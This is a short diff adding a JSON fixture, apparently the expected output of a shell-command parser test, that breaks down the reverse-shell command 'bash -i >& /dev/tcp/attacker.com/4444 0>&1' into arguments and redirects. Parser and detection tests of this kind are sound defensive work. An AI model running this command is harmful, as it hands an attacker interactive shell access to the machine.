@@ -1,0 +1,30 @@
+[
+  {
+    "argv": [
+      "bash",
+      "-i"
+    ],
+    "original": [
+      "bash",
+      "-i",
+      ">&",
+      "/dev/tcp/attacker.com/4444",
+      "0>&1"
+    ],
+    "terminator": "NEWLINE",
+    "redirects": [
+      {
+        "op": ">&",
+        "fd": 1,
+        "target": "/dev/tcp/attacker.com/4444"
+      },
+      {
+        "op": ">&",
+        "fd": 0,
+        "target": "1"
+      }
+    ],
+    "depth": 0,
+    "origin": "top"
+  }
+]
